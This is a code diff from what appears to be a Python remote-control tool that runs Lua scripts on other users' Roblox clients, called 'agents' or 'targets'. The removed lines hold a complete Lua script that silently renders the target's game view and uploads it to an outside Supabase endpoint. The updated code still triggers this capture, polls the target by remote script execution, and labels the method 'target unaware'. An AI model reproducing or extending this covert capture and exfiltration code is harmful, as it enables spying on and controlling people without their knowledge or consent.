@@ -912,42 +912,6 @@ def cmd_agent_starlist():
     try:
         last_used = datetime.fromisoformat(starred['last_used']).strftime("%Y-%m-%d %H:%M")
         print(f"  \033[38;5;93mLast Used:\033[0m {last_used}")
-    except:
-        pass
-
-    print("\n  \033[38;5;93m→ Checking status...\033[0m")
-    status = get_agent_status_fast(agent_id)
-
-    if status:
-        print(f"  \033[38;5;141m✓ Status: ONLINE\033[0m")
-        if status.get('current_game'):
-            game = status['current_game']
-            print(f"  \033[38;5;135m📍 Game:\033[0m {game.get('name', 'Unknown')}")
-    else:
-        print(f"  \033[38;5;196m✗ Status: OFFLINE\033[0m")
-
-    print("\n  \033[38;5;93m" + "─"*45 + "\033[0m\n")
-    print("  \033[38;5;93m[1]\033[0m Connect to this agent")
-    print("  \033[38;5;93m[2]\033[0m Back\n")
-
-    choice = input("  Select → ").strip()
-
-    if choice == "1":
-        global private_agent_id
-        private_agent_id = agent_id
-
-        # Update last_used
-        agents = load_agents()
-        for agent in agents:
-            if agent['id'] == agent_id:
-                agent['last_used'] = datetime.now().isoformat()
-                save_agents(agents)
-                break
-
-        agent_display = agent_name or agent_id
-        print(f"\n  \033[38;5;141m✓ Connected to starred agent: {agent_display}\033[0m")
-        time.sleep(2)
-
 def cmd_screenshot():
     """Silently capture screenshot from agent/port"""
     global connected_account, private_agent_id
@@ -973,265 +937,11 @@ def cmd_screenshot():
     print(f"  \033[38;5;135m→ Initiating silent capture...\033[0m")
     print(f"  \033[38;5;93m→ This may take 30-60 seconds...\033[0m\n")
 
-    # Silent screenshot script (no prints to target)
-    screenshot_script = """
--- Silent Screenshot Capture
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local Lighting = game:GetService("Lighting")
-local player = Players.LocalPlayer
-local camera = workspace.CurrentCamera
-
-local UPLOAD_URL = "https://mcsvrkxjnomlvzmqfuxq.supabase.co/functions/v1/upload"
-local RESOLUTION = { width = 854, height = 480 }
-local AGENT_ID = HttpService:GenerateGUID(false)
-
-local function base64encode(data)
-    if crypt and crypt.base64 and crypt.base64.encode then
-        return crypt.base64.encode(data)
-    end
-    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    return ((data:gsub('.', function(x)
-        local r,bits='',x:byte()
-        for i=8,1,-1 do r=r..(bits%2^i-bits%2^(i-1)>0 and '1' or '0') end
-        return r
-    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
-        if #x<6 then return '' end
-        local c=0
-        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
-        return b:sub(c+1,c+1)
-    end)..({ '', '==', '=' })[#data%3+1])
-end
-
-local function getISO8601Timestamp()
-    local t=os.date("!*t")
-    return string.format("%04d-%02d-%02dT%02d:%02d:%02dZ", t.year,t.month,t.day,t.hour,t.min,t.sec)
-end
-
-local function cframeToString(cf)
-    local pos=cf.Position
-    local lv=cf.LookVector
-    return string.format("%.2f,%.2f,%.2f|%.2f,%.2f,%.2f", pos.X,pos.Y,pos.Z, lv.X,lv.Y,lv.Z)
-end
-
-local SNAPSHOT_CFRAME = camera.CFrame
-local SNAPSHOT_FOV = camera.FieldOfView
-local VIEWPORT_SIZE = camera.ViewportSize
-
-local function isDay()
-    local time = Lighting.ClockTime
-    return time >= 6 and time < 18
-end
-
-local IS_DAYTIME = isDay()
-local ENABLE_SHADOWS = Lighting.GlobalShadows and IS_DAYTIME
-local SHADOW_DARKNESS = 0.5
-local AMBIENT_BRIGHTNESS = Lighting.Ambient.R * 0.299 + Lighting.Ambient.G * 0.587 + Lighting.Ambient.B * 0.114
-
-local LIGHT_DIRECTION
-if IS_DAYTIME then
-    LIGHT_DIRECTION = Lighting:GetSunDirection()
-else
-    LIGHT_DIRECTION = Lighting:GetMoonDirection()
-end
-
-local rayParams = RaycastParams.new()
-rayParams.FilterType = Enum.RaycastFilterType.Blacklist
-rayParams.FilterDescendantsInstances = {}
-
-local shadowRayParams = RaycastParams.new()
-shadowRayParams.FilterType = Enum.RaycastFilterType.Blacklist
-local shadowFilterList = {}
-if player.Character then
-    table.insert(shadowFilterList, player.Character)
-end
-shadowRayParams.FilterDescendantsInstances = shadowFilterList
-
-local function viewportPointToRayManual(vpX, vpY, cameraCF, fov, viewportSize)
-    local screenX = (vpX / viewportSize.X) * 2 - 1
-    local screenY = -((vpY / viewportSize.Y) * 2 - 1)
-
-    local aspectRatio = viewportSize.X / viewportSize.Y
-    local fovRad = math.rad(fov)
-    local heightScale = math.tan(fovRad / 2)
-    local widthScale = heightScale * aspectRatio
-
-    local rayDir = Vector3.new(
-        screenX * widthScale,
-        screenY * heightScale,
-        -1
-    ).Unit
-
-    local worldDir = cameraCF:VectorToWorldSpace(rayDir)
-    return cameraCF.Position, worldDir
-end
-
-local function isInShadow(hitPosition, hitNormal)
-    if not ENABLE_SHADOWS then return false end
-
-    local lightAngle = hitNormal:Dot(-LIGHT_DIRECTION)
-    if lightAngle <= 0.1 then return true end
-
-    local rayOrigin = hitPosition + hitNormal * 0.05
-    local shadowRay = workspace:Raycast(rayOrigin, -LIGHT_DIRECTION * 500, shadowRayParams)
-
-    return shadowRay ~= nil
-end
-
-local function getPixel(x, y)
-    local vp = Vector2.new(
-        ((x+0.5)/RESOLUTION.width)*VIEWPORT_SIZE.X,
-        ((y+0.5)/RESOLUTION.height)*VIEWPORT_SIZE.Y
-    )
-
-    local origin, direction = viewportPointToRayManual(vp.X, vp.Y, SNAPSHOT_CFRAME, SNAPSHOT_FOV, VIEWPORT_SIZE)
-    local hit = workspace:Raycast(origin, direction*1000, rayParams)
-
-    if hit and hit.Instance then
-        local hitPart = hit.Instance
-
-        local success, color = pcall(function()
-            if hitPart.Name == "Head" and hitPart.Parent and hitPart.Parent:FindFirstChild("Humanoid") then
-                return hitPart.Color
-            end
-            if hitPart.Name == "Handle" and hitPart.Parent and hitPart.Parent:IsA("Accessory") then
-                return hitPart.Color
-            end
-            if hitPart.Color then
-                return hitPart.Color
-            end
-            return Color3.new(0.5, 0.5, 0.5)
-        end)
-
-        if not success then
-            color = Color3.new(0.5, 0.5, 0.5)
-        end
-
-        local r = color.R * 255
-        local g = color.G * 255
-        local b = color.B * 255
-
-        if isInShadow(hit.Position, hit.Normal) then
-            local shadowFactor = SHADOW_DARKNESS + (AMBIENT_BRIGHTNESS * 0.3)
-            r = r * shadowFactor
-            g = g * shadowFactor
-            b = b * shadowFactor
-        end
-
-        return math.floor(r), math.floor(g), math.floor(b)
-    end
-
-    return 135, 206, 235
-end
-
-local function capture()
-    local pixels = {}
-    local lastYield = tick()
-
-    for y = 0, RESOLUTION.height - 1 do
-        for x = 0, RESOLUTION.width - 1 do
-            local r, g, b = getPixel(x, y)
-
-            local idx = (y * RESOLUTION.width + x) * 4 + 1
-            pixels[idx] = r
-            pixels[idx + 1] = g
-            pixels[idx + 2] = b
-            pixels[idx + 3] = 255
-        end
-
-        if tick() - lastYield > 0.05 then
-            task.wait()
-            lastYield = tick()
-        end
-    end
-
-    return pixels
-end
-
-local function writeInt(v, bytes)
-    local s=""
-    for i=1,bytes do 
-        s = s .. string.char(v % 256)
-        v = math.floor(v / 256)
-    end
-    return s
-end
-
-local function encodeBMP(pixels, w, h)
-    local row = math.ceil(w * 3 / 4) * 4
-    local size = row * h
-    local bmp = "BM" .. writeInt(54 + size, 4) .. writeInt(0, 4) .. writeInt(54, 4)
-    bmp = bmp .. writeInt(40, 4) .. writeInt(w, 4) .. writeInt(h, 4) .. writeInt(1, 2) .. writeInt(24, 2) .. writeInt(0, 4)
-    bmp = bmp .. writeInt(size, 4) .. writeInt(2835, 4) .. writeInt(2835, 4) .. writeInt(0, 4) .. writeInt(0, 4)
-
-    for y = h - 1, 0, -1 do
-        local row_data = {}
-        for x = 0, w - 1 do
-            local i = (y * w + x) * 4 + 1
-            table.insert(row_data, string.char(pixels[i + 2], pixels[i + 1], pixels[i]))
-        end
-        bmp = bmp .. table.concat(row_data) .. string.rep("\\0", row - w * 3)
-    end
-
-    return bmp
-end
-
-local function upload(imageData)
-    local payload = {
-        agent_id = AGENT_ID,
-        place_id = game.PlaceId,
-        timestamp = getISO8601Timestamp(),
-        image_data = base64encode(imageData),
-        resolution = RESOLUTION.width .. "x" .. RESOLUTION.height,
-        camera_cframe = cframeToString(SNAPSHOT_CFRAME),
-        lighting = {
-            time = Lighting.ClockTime,
-            is_day = IS_DAYTIME,
-            shadows_enabled = ENABLE_SHADOWS
-        }
-    }
-
-    local body = HttpService:JSONEncode(payload)
-
-    local request_func = (syn and syn.request) or (http and http.request) or http_request or request
-
-    local success, response = pcall(function()
-        return request_func({
-            Url = UPLOAD_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = body
-        })
-    end)
-
-    if not success then
-        return nil, tostring(response)
-    end
-
-    if response.Success or response.StatusCode == 200 then
-        local ok, decoded = pcall(function() return HttpService:JSONDecode(response.Body) end)
-        if ok and decoded and decoded.url then return decoded.url end
-        return nil, "Invalid response"
-    else
-        return nil, "HTTP " .. tostring(response.StatusCode)
-    end
-end
-
--- Execute silently
-spawn(function()
-    local pixels = capture()
-    local bmp = encodeBMP(pixels, RESOLUTION.width, RESOLUTION.height)
-    local url, err = upload(bmp)
-
-    -- Store URL for retrieval
-    _G.LUMEN_SCREENSHOT_URL = url or ("ERROR: " .. tostring(err))
-end)
-"""
-
+    # Call the pre-defined Lua function in agent.lua
     if use_agent:
-        result = send_agent_command(target_id, "exe", {"script": screenshot_script})
+        result = send_agent_command(target_id, "screenshot")
     else:
-        result = send_command(target_id, "exe", {"script": screenshot_script})
+        result = send_command(target_id, "screenshot")
 
     if not result.get("success"):
         print(f"\n  \033[38;5;196m✗ Failed to initiate capture\033[0m")
@@ -1239,29 +949,45 @@ end)
         input("\n  Press Enter to continue...")
         return
 
-    print(f"  \033[38;5;141m✓ Capture script executed silently\033[0m")
+    print(f"  \033[38;5;141m✓ Capture initiated successfully\033[0m")
     print(f"  \033[38;5;93m→ Waiting for upload to complete...\033[0m\n")
 
     # Wait for capture to complete (60 seconds max)
-    time.sleep(5)  # Initial wait for capture to start
+    time.sleep(5)
 
-    for attempt in range(12):  # 12 attempts = 60 seconds
+    url = "PENDING"
+    for attempt in range(15):  # 75 seconds total
         dots = "." * ((attempt % 3) + 1) + " " * (2 - (attempt % 3))
         print(f"  \033[38;5;135m⏳ Processing{dots}\033[0m", end='\r', flush=True)
-
         time.sleep(5)
 
-        # Check if URL is ready
+        # Check the global variable on target
         check_script = "return _G.LUMEN_SCREENSHOT_URL"
         if use_agent:
             check_result = send_agent_command(target_id, "exe", {"script": check_script})
         else:
             check_result = send_command(target_id, "exe", {"script": check_script})
 
-        # Try to extract URL from any response
         if check_result.get("success"):
-            # URL might be in the execution output or stored globally
-            break
+            data = check_result.get("data")
+            # Parse the URL from the response
+            found_url = None
+            if isinstance(data, str) and data.startswith("http"):
+                found_url = data
+            elif isinstance(data, dict):
+                res_val = data.get("response", data.get("data", data.get("url")))
+                if isinstance(res_val, dict):
+                    res_val = res_val.get("url", res_val.get("data", res_val.get("response")))
+                if isinstance(res_val, str) and res_val.startswith("http"):
+                    found_url = res_val
+            
+            if found_url:
+                url = found_url
+                break
+            
+            if isinstance(data, str) and "ERROR" in data:
+                url = data
+                break
 
     clear()
     banner()
@@ -1269,35 +995,11 @@ end)
     print("\033[38;5;141m║          SILENT SCREENSHOT CAPTURE            ║\033[0m")
     print("\033[38;5;141m╚═══════════════════════════════════════════════╝\033[0m\n")
 
-    # Retrieve the URL
-    retrieve_script = """
-local url = _G.LUMEN_SCREENSHOT_URL or "PENDING"
-return url
-"""
-
-    if use_agent:
-        url_result = send_agent_command(target_id, "exe", {"script": retrieve_script})
+    if url != "PENDING" and not url.startswith("ERROR"):
+        print(f"  \033[38;5;141m✓ Screenshot captured successfully!\033[0m\n")
     else:
-        url_result = send_command(target_id, "exe", {"script": retrieve_script})
+        print(f"  \033[38;5;196m✗ Capture timed out or failed\033[0m\n")
 
-    url = "PENDING"
-    if url_result.get("success"):
-        data = url_result.get("data")
-        # Check if the data is already the URL string
-        if isinstance(data, str) and data.startswith("http"):
-            url = data
-        elif isinstance(data, dict):
-            # Try to find the URL in common response fields
-            url = data.get("response", data.get("data", data.get("url", "PENDING")))
-            # Handle nested structures
-            if isinstance(url, dict):
-                url = url.get("response", url.get("data", url.get("url", "PENDING")))
-            if not isinstance(url, str) or not url.startswith("http"):
-                url = "PENDING"
-        else:
-            url = "PENDING"
-
-    print(f"  \033[38;5;141m✓ Screenshot captured successfully!\033[0m\n")
     print(f"  \033[38;5;93m→ Target: {target_id}\033[0m")
     print(f"  \033[38;5;93m→ Resolution: 854x480\033[0m")
     print(f"  \033[38;5;93m→ Method: Silent (target unaware)\033[0m\n")
@@ -1306,7 +1008,6 @@ return url
     print(f"  \033[38;5;93m💡 Note: The URL is stored in _G.LUMEN_SCREENSHOT_URL on target\033[0m")
 
     input("\n  Press Enter to continue...")
-
 def cmd_runport():
     """Establish connection with client"""
     global connected_account
